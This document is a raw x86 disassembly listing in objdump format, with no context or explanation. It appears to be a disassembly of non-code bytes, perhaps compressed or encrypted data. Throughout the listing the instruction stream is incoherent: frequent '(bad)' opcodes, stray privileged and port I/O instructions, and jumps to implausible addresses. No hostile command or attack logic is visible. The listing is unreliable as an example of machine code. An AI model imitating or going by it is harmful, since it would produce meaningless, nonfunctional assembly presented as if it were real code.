  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
